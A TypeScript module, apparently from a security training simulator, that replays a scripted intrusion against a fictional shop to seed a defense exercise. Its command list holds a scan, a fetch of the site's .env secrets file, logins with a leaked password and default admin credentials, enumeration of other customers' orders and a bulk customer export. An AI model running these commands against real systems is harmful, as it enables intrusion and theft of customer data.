import { runCommand } from "./command";
import { initialState } from "./types";

const incidentCommands = [
  "nmap -sV shop.komaba-market.example",
  "curl https://shop.komaba-market.example",
  "curl https://shop.komaba-market.example/.env",
  'curl -X POST -H \'Content-Type: application/json\' -d \'{"email":"staff-old@komaba-market.example","password":"Komaba2023!"}\' https://shop.komaba-market.example/api/login',
  'curl -H "Authorization: Bearer demo_tok_4f2a" https://shop.komaba-market.example/api/orders/1002',
  'for id in {1001..1050}; do curl -H "Authorization: Bearer demo_tok_4f2a" "https://shop.komaba-market.example/api/orders/$id"; done',
  "curl https://shop.komaba-market.example/robots.txt",
  'curl -X POST -H \'Content-Type: application/json\' -d \'{"username":"admin","password":"admin123"}\' https://shop.komaba-market.example/admin/login',
  "curl https://shop.komaba-market.example/admin/export/customers.csv -o customers.csv",
];

export function createDefenseScenario(simulationId = "simulation-1") {
  let state = initialState();
  for (const command of incidentCommands) state = runCommand(command, state).state;
  return {
    ...state,
    simulationId,
    mode: "defense" as const,
    phase: "defense" as const,
    logs: state.logs,
  };
}
